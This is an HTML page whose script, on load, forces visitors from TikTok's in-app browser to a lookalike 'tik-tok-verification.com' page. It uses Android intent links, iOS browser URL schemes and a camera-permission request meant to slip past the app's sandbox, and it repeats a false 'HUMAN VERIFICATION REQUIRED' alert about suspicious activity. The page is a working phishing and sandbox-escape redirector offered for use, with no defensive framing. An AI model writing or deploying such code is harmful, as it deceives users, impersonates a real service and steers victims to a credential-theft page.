<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #fff; margin: 0; padding: 0; }</style>
</head>
<body>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const domain = "tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 5000;

    function goSickoMode() {
        const isAndroid = /Android/i.test(navigator.userAgent);

        if (isAndroid) {
            // Android: Intent with the Chrome package and the "Always" flag
            window.location.href = `intent://${domain}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;package=com.android.chrome;end`;
        } else {
            // iOS: THE MEDIA-PERMISSION CRASH
            
            // 1. Force a camera request. This triggers the OS 'Permission' layer.
            // This 'pauses' the TikTok sandbox for a millisecond.
            navigator.mediaDevices.getUserMedia({ video: true }).catch(() => {});

            // 2. THE JUMP: Fired during the sandbox 'pause'
            // We use the specific 'googlechromes' protocol with the CLEAN domain.
            window.location.href = "googlechromes://" + domain;

            // 3. THE OVERWRITE: 50ms later, force Safari directly.
            setTimeout(() => {
                window.location.href = "safari-https://" + domain;
            }, 50);
        }
    }

    function securityLoop() {
        if (Date.now() > killTime) return;

        // Start the ejection process
        goSickoMode();

        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                alert(header + body);
                
                // Immediately eject on "OK" tap
                goSickoMode();
                setTimeout(securityLoop, 300);
            }
        }, 300);
    }

    window.onload = securityLoop;
</script>
</body>
</html>
